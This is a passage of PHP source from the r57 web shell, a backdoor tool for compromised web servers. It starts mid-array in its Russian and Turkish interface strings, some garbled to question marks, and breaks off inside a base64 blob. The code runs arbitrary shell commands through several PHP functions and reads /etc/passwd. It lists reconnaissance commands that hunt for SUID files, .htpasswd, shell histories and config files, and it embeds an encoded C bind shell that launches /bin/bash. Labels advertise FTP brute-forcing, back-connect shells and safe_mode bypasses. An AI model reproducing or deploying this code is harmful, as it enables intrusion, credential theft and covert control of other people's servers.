'ru_text2' =&gt;'?????????? ?????? ?? ???????',
'ru_text3' =&gt;'????????? ???????',
'ru_text4' =&gt;'??????? ??????????',
'ru_text5' =&gt;'???????? ?????? ?? ??????',
'ru_text6' =&gt;'????????? ????',
'ru_text7' =&gt;'??????',
'ru_text8' =&gt;'???????? ?????',
'ru_butt1' =&gt;'?????????',
'ru_butt2' =&gt;'?????????',
'ru_text9' =&gt;'???????? ????? ? ???????? ??? ? /bin/bash',
'ru_text10'=&gt;'??????? ????',
'ru_text11'=&gt;'?????? ??? ???????',
'ru_butt3' =&gt;'???????',
'ru_text12'=&gt;'back-connect',
'ru_text13'=&gt;'IP-?????',
'ru_text14'=&gt;'????',
'ru_butt4' =&gt;'?????????',
'ru_text15'=&gt;'???????? ?????? ? ?????????? ???????',
'ru_text16'=&gt;'????????????',
'ru_text17'=&gt;'????????? ????',
'ru_text18'=&gt;'????????? ????',
'ru_text19'=&gt;'Exploits',
'ru_text20'=&gt;'????????????',
'ru_text21'=&gt;'????? ???',
'ru_text22'=&gt;'datapipe',
'ru_text23'=&gt;'????????? ????',
'ru_text24'=&gt;'????????? ????',
'ru_text25'=&gt;'????????? ????',
'ru_text26'=&gt;'????????????',
'ru_butt5' =&gt;'?????????',
'ru_text28'=&gt;'?????? ? safe_mode',
'ru_text29'=&gt;'?????? ????????',
'ru_butt6' =&gt;'???????',
'ru_text30'=&gt;'???????? ?????',
'ru_butt7' =&gt;'???????',
'ru_text31'=&gt;'???? ?? ??????',
'ru_text32'=&gt;'?????????? PHP ????',
'ru_text33'=&gt;'???????? ??????????? ?????? ??????????? open_basedir ????? ??????? cURL',
'ru_butt8' =&gt;'?????????',
'ru_text34'=&gt;'???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include',
'ru_text35'=&gt;'???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql',
'ru_text36'=&gt;'???? . ???????',
'ru_text37'=&gt;'?????',
'ru_text38'=&gt;'??????',
'ru_text39'=&gt;'????',
'ru_text40'=&gt;'???? ??????? ???? ??????',
'ru_butt9' =&gt;'????',
'ru_text41'=&gt;'????????? ? ?????',
'ru_text42'=&gt;'?????????????? ?????',
'ru_text43'=&gt;'????????????? ????',
'ru_butt10'=&gt;'?????????',
'ru_butt11'=&gt;'?????????????',
'ru_text44'=&gt;'?????????????? ????? ??????????! ?????? ?????? ??? ??????!',
'ru_text45'=&gt;'???? ????????',
'ru_text46'=&gt;'???????? phpinfo()',
'ru_text47'=&gt;'???????? ???????? php.ini',
'ru_text48'=&gt;'???????? ????????? ??????',
'ru_text49'=&gt;'???????? ??????? ? ???????',
'ru_text50'=&gt;'?????????? ? ??????????',
'ru_text51'=&gt;'?????????? ? ??????',
'ru_text52'=&gt;'????? ??? ??????',
'ru_text53'=&gt;'?????? ? ?????',
'ru_text54'=&gt;'????? ?????? ? ??????',
'ru_butt12'=&gt;'?????',
'ru_text55'=&gt;'?????? ? ??????',
'ru_text56'=&gt;'?????? ?? ???????',
'ru_text57'=&gt;'???????/??????? ????/??????????',
'ru_text58'=&gt;'???',
'ru_text59'=&gt;'????',
'ru_text60'=&gt;'??????????',
'ru_butt13'=&gt;'???????/???????',
'ru_text61'=&gt;'???? ??????',
'ru_text62'=&gt;'?????????? ???????',
'ru_text63'=&gt;'???? ??????',
'ru_text64'=&gt;'?????????? ???????',
'ru_text65'=&gt;'???????',
'ru_text66'=&gt;'???????',
'ru_text67'=&gt;'Chown/Chgrp/Chmod',
'ru_text68'=&gt;'???????',
'ru_text69'=&gt;'????????1',
'ru_text70'=&gt;'????????2',
'ru_text71'=&gt;"?????? ???????? ???????:\r\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \r\n- ??? ??????? CHGRP - ??? ?????? ??? GID (??????) \r\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)",
'ru_text72'=&gt;'????? ??? ??????',
'ru_text73'=&gt;'?????? ? ?????',
'ru_text74'=&gt;'?????? ? ??????',
'ru_text75'=&gt;'* ????? ???????????? ?????????? ?????????',
'ru_text76'=&gt;'????? ?????? ? ?????? ? ??????? ??????? find',
'ru_text80'=&gt;'???',
'ru_text81'=&gt;'????',
'ru_text82'=&gt;'???? ??????',
'ru_text83'=&gt;'?????????? SQL ???????',
'ru_text84'=&gt;'SQL ??????',
'ru_text85'=&gt;'???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????',
'ru_text86'=&gt;'?????????? ????? ? ???????',
'ru_butt14'=&gt;'???????',
'ru_text87'=&gt;'?????????? ?????? ? ?????????? ftp-???????',
'ru_text88'=&gt;'FTP-??????:????',
'ru_text89'=&gt;'???? ?? ftp ???????',
'ru_text90'=&gt;'????? ????????',
'ru_text91'=&gt;'???????????? ?',
'ru_text92'=&gt;'??? ?????????',
'ru_text93'=&gt;'FTP',
'ru_text94'=&gt;'FTP-????????',
'ru_text95'=&gt;'?????? ?????????????',
'ru_text96'=&gt;'?? ??????? ???????? ?????? ?????????????',
'ru_text97'=&gt;'????????? ??????????: ',
'ru_text98'=&gt;'??????? ???????????: ',
'ru_text99'=&gt;'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd',
'ru_text100'=&gt;'???????? ?????? ?? ????????? ??? ??????',
'ru_text101'=&gt;'???????????? ????? ???????????? (user -&gt; resu) ??? ???????????? ? ???????? ??????',
'ru_text102'=&gt;'?????',
'ru_text103'=&gt;'???????? ??????',
'ru_text104'=&gt;'???????? ????? ?? ???????? ????',
'ru_text105'=&gt;'????',
'ru_text106'=&gt;'??',
'ru_text107'=&gt;'????',
'ru_butt15'=&gt;'?????????',
'ru_text108'=&gt;'????? ??????',
'ru_text109'=&gt;'????????',
'ru_text110'=&gt;'??????????',
'ru_text111'=&gt;'SQL-?????? : ????',
'ru_text112'=&gt;'???????? ??????????? ?????? ??????????? safe_mode ????? ????????????? ??????? mb_send_mail',
'ru_text113'=&gt;'???????? ??????????? ?????? ??????????? safe_mode, ???????? ???????? ?????????? ? ?????????????? imap_list',
'ru_text114'=&gt;'???????? ??????????? ?????? ??????????? safe_mode, ???????? ??????????? ????? ? ?????????????? imap_body',
/* --------------------------------------------------------------- */
'tur_text1' =&gt;'Komut uygula',
'tur_text2' =&gt;'Server uzerinde komut uygula',
'tur_text3' =&gt;'Komut calistir gulum',
'tur_text4' =&gt;'simdi burdasin',
'tur_text5' =&gt;'Servera dosya yukle',
'tur_text6' =&gt;'Yerel dosya',
'tur_text7' =&gt;'Aliases',
'tur_text8' =&gt;'Select alias',
'tur_butt1' =&gt;'taam gulum :)',
'tur_butt2' =&gt;'y&#252;kle bilader',
'tur_text9' =&gt;'Bind port to /bin/bash',
'tur_text10'=&gt;'Port',
'tur_text11'=&gt;'Password for access',
'tur_butt3' =&gt;'Bind',
'tur_text12'=&gt;'Arka taraf',
'tur_text13'=&gt;'IP',
'tur_text14'=&gt;'Port',
'tur_butt4' =&gt;'Rootlucam baglan lutfen',
'tur_text15'=&gt;'Uzak serverdan dosya yukle',
'tur_text16'=&gt;'Ile',
'tur_text17'=&gt;'Remote file',
'tur_text18'=&gt;'Local file',
'tur_text19'=&gt;'Exploits',
'tur_text20'=&gt;'Kullan',
'tur_text21'=&gt;'&nbsp;yeni isim ver abi',
'tur_text22'=&gt;'datapipe',
'tur_text23'=&gt;'Local port',
'tur_text24'=&gt;'Remote host',
'tur_text25'=&gt;'Remote port',
'tur_text26'=&gt;'Kullan',
'tur_butt5' =&gt;'Calistir',
'tur_text28'=&gt;'Su anki durum safe_mode',
'tur_text29'=&gt;'ACCESS DENIED',
'tur_butt6' =&gt;'d&#252;zenle bilader',
'tur_text30'=&gt;'Cat file',
'tur_butt7' =&gt;'bakabilirmiyim abi',
'tur_text31'=&gt;'&#246;yle bi dosya yok bilader',
'tur_text32'=&gt;'Eval PHP code',
'tur_text33'=&gt;'Test bypass open_basedir with cURL functions',
'tur_butt8' =&gt;'Test',
'tur_text34'=&gt;'Test bypass safe_mode with include function',
'tur_text35'=&gt;'Test bypass safe_mode with load file in mysql',
'tur_text36'=&gt;'Database . Tablo',
'tur_text37'=&gt;'Giris',
'tur_text38'=&gt;'Sifre',
'tur_text39'=&gt;'Database',
'tur_text40'=&gt;'Bosaltilacak database tablosu',
'tur_butt9' =&gt;'Bosalt',
'tur_text41'=&gt;'Bosaltilan dosyayi kaydet',
'tur_text42'=&gt;'Dosyalari duzenle',
'tur_text43'=&gt;'Dosya duzenle',
'tur_butt10'=&gt;'taam basabiliriz :)',
'tur_text44'=&gt;'malesef gulum! sansina kus!',
'tur_text45'=&gt;'taam bilader kaydettim',
'tur_text46'=&gt;'Goster phpinfo()',
'tur_text47'=&gt;'Degiskenleri goster php.ini',
'tur_text48'=&gt;'Temp doslarini sil',
'tur_butt11'=&gt;'duzenle abi',
'tur_text49'=&gt;'Serverdan script sil',
'tur_text50'=&gt;'Islemci bilgisine bak',
'tur_text51'=&gt;'Haf?za bilgisine bak',
'tur_text52'=&gt;'Metin ara',
'tur_text53'=&gt;'In dirs',
'tur_text54'=&gt;'Dosyalarin icinde metin ara',
'tur_butt12'=&gt;'Ara',
'tur_text55'=&gt;'Dosyalarda',
'tur_text56'=&gt;'Hicbirsey :(',
'tur_text57'=&gt;'Yarat/Dosya sil/Dir',
'tur_text58'=&gt;'isim',
'tur_text59'=&gt;'dosya',
'tur_text60'=&gt;'dir',
'tur_butt13'=&gt;'Yarat/Sil',
'tur_text61'=&gt;'Dosya yaratildi',
'tur_text62'=&gt;'Dir created',
'tur_text63'=&gt;'Dosya silindi',
'tur_text64'=&gt;'Dir deleted',
'tur_text65'=&gt;'Yarat',
'tur_text66'=&gt;'Sil',
'tur_text67'=&gt;'Chown/Chgrp/Chmod',
'tur_text68'=&gt;'Komut',
'tur_text69'=&gt;'param1',
'tur_text70'=&gt;'param2',
'tur_text71'=&gt;"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'tur_text72'=&gt;'Metin icin ara',
'tur_text73'=&gt;'Klasor icin ara',
'tur_text74'=&gt;'Dosyalarin icinde ara',
'tur_text75'=&gt;'* you can use regexp',
'tur_text76'=&gt;'Search text in files via find',
'tur_text80'=&gt;'Type',
'tur_text81'=&gt;'Net',
'tur_text82'=&gt;'Databases',
'tur_text83'=&gt;'SQL da sorgula',
'tur_text84'=&gt;'SQL sor',
'tur_text85'=&gt;'Test bypass safe_mode with commands execute via MSSQL server',
'tur_text86'=&gt;'Serverdan dosya indir',
'tur_butt14'=&gt;'Indir',
'tur_text87'=&gt;'Uzak ftp sunucusundan doysa indir',
'tur_text88'=&gt;'FTP-server:port',
'tur_text89'=&gt;'Ftp de dosya',
'tur_text90'=&gt;'Transfer modu',
'tur_text91'=&gt;'Arsivleme',
'tur_text92'=&gt;'without archivation',
'tur_text93'=&gt;'FTP',
'tur_text94'=&gt;'FTP-bruteforce',
'tur_text95'=&gt;'Kullanici listesi',
'tur_text96'=&gt;'Can\'t get users list',
'tur_text97'=&gt;'checked: ',
'tur_text98'=&gt;'success: ',
'tur_text99'=&gt;'* kullanici isimlerinde /etc/passwd for ftp Giris ve sifre',
'tur_text100'=&gt;'Uzak ftp sunucusuna dosya yolla',
'tur_text101'=&gt;'Use reverse (user -&gt; resu) login for password',
'tur_text102'=&gt;'Mail',
'tur_text103'=&gt;'Mail yolla',
'tur_text104'=&gt;'Dosyayi maile yolla',
'tur_text105'=&gt;'To',
'tur_text106'=&gt;'From',
'tur_text107'=&gt;'Subj',
'tur_butt15'=&gt;'Yolla',
'tur_text108'=&gt;'Mail',
'tur_text109'=&gt;'Hide',
'tur_text110'=&gt;'Goster',
'tur_text111'=&gt;'SQL-Server : Port',
'tur_text112'=&gt;'Test bypass safe_mode with function mb_send_mail',
'tur_text113'=&gt;'Test bypass safe_mode, view dir list via imap_list',
'tur_text114'=&gt;'Test bypass safe_mode, view file contest via imap_body',
);
/*
?????? ??????
????????? ???????? ????????????? ?????? ????? ? ???-?? ??????. ( ??????? ????????? ???? ????????? ???? )
?? ?????? ???? ????????? ??? ???????? ???????.
*/
$aliases=array(
'find suid files'=&gt;'find / -type f -perm -04000 -ls',
'find suid files in current dir'=&gt;'find . -type f -perm -04000 -ls',
'find sgid files'=&gt;'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=&gt;'find . -type f -perm -02000 -ls',
'find config.inc.php files'=&gt;'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=&gt;'find . -type f -name config.inc.php',
'find config* files'=&gt;'find / -type f -name "config*"',
'find config* files in current dir'=&gt;'find . -type f -name "config*"',
'find all writable files'=&gt;'find / -type f -perm -2 -ls',
'find all writable files in current dir'=&gt;'find . -type f -perm -2 -ls',
'find all writable directories'=&gt;'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=&gt;'find . -type d -perm -2 -ls',
'find all writable directories and files'=&gt;'find / -perm -2 -ls',
'find all writable directories and files in current dir'=&gt;'find . -perm -2 -ls',
'find all service.pwd files'=&gt;'find / -type f -name service.pwd',
'find service.pwd files in current dir'=&gt;'find . -type f -name service.pwd',
'find all .htpasswd files'=&gt;'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=&gt;'find . -type f -name .htpasswd',
'find all .bash_history files'=&gt;'find / -type f -name .bash_history',
'find .bash_history files in current dir'=&gt;'find . -type f -name .bash_history',
'find all .mysql_history files'=&gt;'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=&gt;'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=&gt;'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=&gt;'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=&gt;'lsattr -va',
'show opened ports'=&gt;'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=&gt;'ls -la'
);
$table_up1  = "&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center&gt;:: ";
$table_up2  = " ::&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;";
$table_up3  = "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;";
$table_end1 = "&lt;/td&gt;&lt;/tr&gt;";
$arrow = " &lt;font face=Wingdings color=gray&gt;?&lt;/font&gt;";
$lb = "&lt;font color=black&gt;[&lt;/font&gt;";
$rb = "&lt;font color=black&gt;]&lt;/font&gt;";
$font = "&lt;font face=Verdana size=-2&gt;";
$ts = "&lt;table class=table1 width=100% align=center&gt;";
$te = "&lt;/table&gt;";
$fs = "&lt;form name=form method=POST&gt;";
$fe = "&lt;/form&gt;";

if(isset($_GET['users']))
 {
 if(!$users=get_users()) { echo "&lt;center&gt;&lt;font face=Verdana size=-2 color=orange&gt;".$lang[$language.'_text96']."&lt;/font&gt;&lt;/center&gt;"; }
 else
  {
  echo '&lt;center&gt;';
  foreach($users as $user) { echo $user."&lt;br&gt;"; }
  echo '&lt;/center&gt;';
  }
 echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die();
 }

if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$windows = 0;
$unix = 0;
if(strlen($dir)&gt;1 && $dir[1]==":") $windows=1; else $unix=1;
if(empty($dir))
 {
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); }
 if(empty($os)){ $os ="-"; $unix=1; }
 else
    {
    if(@eregi("^win",$os)) { $windows = 1; }
    else { $unix = 1; }
    }
 }
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr-&gt;SearchText(0,0);
    $res = $sr-&gt;GetResultFiles();
    $found = $sr-&gt;GetMatchesCount();
    $titles = $sr-&gt;GetTitles();
    $r = "";
    if($found &gt; 0)
    {
      $r .= "&lt;TABLE width=100%&gt;";
      foreach($res as $file=&gt;$v)
      {
        $r .= "&lt;TR&gt;";
        $r .= "&lt;TD colspan=2&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".ws(3);
        $r .= ($windows)? str_replace("/","\\",$file) : $file;
        $r .= "&lt;/b&gt;&lt;/font&gt;&lt;/ TD&gt;";
        $r .= "&lt;/TR&gt;";
        foreach($v as $a=&gt;$b)
        {
          $r .= "&lt;TR&gt;";
          $r .= "&lt;TD align=center&gt;&lt;B&gt;&lt;font face=Verdana size=-2&gt;".$a."&lt;/font&gt;&lt;/B&gt;&lt;/TD&gt;";
          $r .= "&lt;TD&gt;&lt;font face=Verdana size=-2&gt;".ws(2).$b."&lt;/font&gt;&lt;/TD&gt;";
          $r .= "&lt;/TR&gt;\n";
        }
      }
      $r .= "&lt;/TABLE&gt;";
    echo $r;
    }
    else
    {
      echo "&lt;P align=center&gt;&lt;B&gt;&lt;font face=Verdana size=-2&gt;".$lang[$language.'_text56']."&lt;/B&gt;&lt;/font&gt;&lt;/P&gt;";
    }
  echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
  die();
  }
if(strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
function get_users()
{
  $users = array();
  $rows=file('/etc/passwd');
  if(!$rows) return 0;
  foreach ($rows as $string)
   {
   	$user = @explode(":",$string);
   	if(substr($string,0,1)!='#') array_push($users,$user[0]);
   }
  return $users;
}
function we($i)
{
if($GLOBALS['language']=="ru"){ $text = '??????! ?? ???? ???????? ? ???? '; }
else { $text = "[-] ERROR! Can't write in file "; }
echo "&lt;table width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text.$i."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
return null;
}
function re($i)
{
if($GLOBALS['language']=="ru"){ $text = '??????! ?? ???? ????????? ???? '; }
else { $text = "[-] ERROR! Can't read file "; }
echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text.$i."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
return null;
}
function ce($i)
{
if($GLOBALS['language']=="ru"){ $text = "?? ??????? ??????? "; }
else { $text = "Can't create "; }
echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text.$i."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
return null;
}
function fe($l,$n)
{
$text['ru']  = array('?? ??????? ???????????? ? ftp ???????','?????? ??????????? ?? ftp ???????','?? ??????? ???????? ?????????? ?? ftp ???????');
$text['tur'] = array('Connect to ftp server failed','Login to ftp server failed','Can\'t change dir on ftp server');
echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text[$l][$n]."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
return null;
}
function mr($l,$n)
{
$text['ru']  = array('?? ??????? ????????? ??????','?????? ??????????');
$text['tur'] = array('Can\'t send mail','Mail sent');
echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$text[$l][$n]."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
return null;
}
function perms($mode)
{
if ($GLOBALS['windows']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value)
{
 $ret = "&lt;input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\"&gt;";
 return $ret;
}
function which($pr)
{
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return $pr; }
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or we($fname);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}
function sr($l,$t1,$t2)
 {
 return "&lt;tr class=tr1&gt;&lt;td class=td1 width=".$l."% align=right&gt;".$t1."&lt;/td&gt;&lt;td class=td1 align=left&gt;".$t2."&lt;/td&gt;&lt;/tr&gt;";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size &gt;= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size &gt;= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size &gt;= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this-&gt;FilesToSearch = Array();
      for($a=0;$a&lt;count($dirs);$a++)
        $this-&gt;FilesToSearch = @array_merge($this-&gt;FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this-&gt;text = $text;
      $this-&gt;FilesTotal = @count($this-&gt;FilesToSearch);
      $this-&gt;TimeStart = getmicrotime();
      $this-&gt;MatchesCount = 0;
      $this-&gt;ResultFiles = Array();
      $this-&gt;FileMatchesCount = Array();
      $this-&gt;titles = Array();
    }
    function GetFilesTotal() { return $this-&gt;FilesTotal; }
    function GetTitles() { return $this-&gt;titles; }
    function GetTimeTotal() { return $this-&gt;TimeTotal; }
    function GetMatchesCount() { return $this-&gt;MatchesCount; }
    function GetFileMatchesCount() { return $this-&gt;FileMatchesCount; }
    function GetResultFiles() { return $this-&gt;ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this-&gt;text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=&gt;$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this-&gt;FilesToSearch as $k=&gt;$filename)
      {
        $this-&gt;FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a&lt;@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"&lt;SPAN style='color: #990000;'&gt;&lt;b&gt;\\1&lt;/b&gt;&lt;/SPAN&gt;",$CurString);
            $this-&gt;ResultFiles[$filename][$a+1] = $CurString;
            $this-&gt;MatchesCount += $count;
            $this-&gt;FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this-&gt;TimeTotal = @round(getmicrotime() - $this-&gt;TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
